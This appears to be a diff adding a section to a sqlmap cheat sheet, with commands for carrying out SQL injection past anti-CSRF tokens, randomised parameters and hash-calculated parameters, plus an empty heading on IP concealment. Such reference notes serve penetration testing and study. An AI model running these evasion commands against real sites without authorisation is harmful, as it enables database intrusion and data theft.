@@ -153,3 +153,19 @@ sqlmap -u URL --union-char='a'
 Add required FROM table (DB-specific like Oracle)
 sqlmap -u URL --union-from=users
 ```
+
+# Bypassing Web Application Protections
+
+```bash
+# Anti-CSRF Token Bypass
+sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
+
+# Unique Value Bypass
+sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch
+
+# Calculated Parameter Bypass
+sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch
+
+# IP Address Concealing
+
+```
